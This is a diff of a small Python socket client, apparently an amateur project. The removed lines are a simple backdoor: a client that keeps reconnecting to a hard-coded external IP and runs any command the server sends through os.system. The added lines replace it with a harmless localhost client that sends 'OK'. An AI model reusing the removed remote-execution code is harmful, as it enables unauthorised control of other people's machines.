@@ -1,57 +1,42 @@
 import socket
-import os
-import random
 import time
-import itertools
 
-class CommandFIlter:
-    def __init__(self):
-        pass # тут уже добавь
+class ClientSock(socket.socket):
+    def __init__(self, HOST, PORT, socket_family, socket_type, BUFFER_SIZE):
+        super().__init__(socket_family, socket_type)
+        self.HOST = HOST
+        self.PORT = PORT
+        self.BUFFER_SIZE = BUFFER_SIZE
+        self.is_connecting = False
 
-host = '26.199.90.194'
-port = 12345
-calc = "C:/Windows/System32/calc.exe"
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-print("Client started...")
-
-while True:
-    try:
-        client_socket.connect((host, port))
-
-        while True:
-                data = client_socket.recv(1024)
-                server_answer = data.decode().split()
-                if not server_answer is None:
-                    if server_answer[0]=='run':
-                        if server_answer[1]=='-s':
-                            is_system = "C:/Windows/System32/"+server_answer[2]
-                            os.system(is_system)
-                            answer_for_server = f"RUN: {server_answer[2]}"
-                            
-                        else:
-                            os.system(server_answer[1])
-                            answer_for_server = f"RUN: {server_answer[1]}"
-                    elif server_answer[0]=='crash':
-                        answer_for_server = "crashing computer"
-                        for a,b,c in itertools.product(itertools.count(0), range(0,10), range(0,10)):
-                            print(a,b,c)
-                            if a > 20: break
-                    elif server_answer[0]=='schot':
-                        answer_for_server = "crashing computer"
-                        for a,b,c in itertools.product(itertools.count(0), range(0,10), range(0,10)):
-                            print(a,b,c)
-                            if a > 20: break
-                    elif server_answer[0]=="disconnect": break
-                    else: answer_for_server = "Command not found"
-                    
-                    
-                    client_socket.send(answer_for_server.encode())
-                else: pass
+    def init(self):
+        self.connect((self.HOST, self.PORT))
+        self.is_connecting = True
         
-    except socket.error as e:                                                                      
-        print(f"Error: {e}")
-        # client_socket.close()
-        print("sleep")
-        time.sleep(random.randint(0, 10))
-        print("unsleep")
+    def start(self):
+        while True:
+            try:
+                self.init()
+                while True:
+                    OK_message = "OK"
+                    self.send(OK_message.encode())
+                    server_message = self.recv(self.BUFFER_SIZE).decode()
+                    print(server_message)
+                    if server_message=="ERROR": pass
+            except KeyboardInterrupt:
+                print("disconnect...")
+            except socket.error as e:
+                print(e)
+                
 
+                time.sleep(1)
+                if e.args[0]==10053:
+                    self.connect((self.HOST, self.PORT))
+                    self.close()
+
+ClientSock(HOST='127.0.0.1',
+           PORT=12345,
+           socket_family=socket.AF_INET,
+           socket_type=socket.SOCK_STREAM,
+           BUFFER_SIZE=1024
+           ).start()
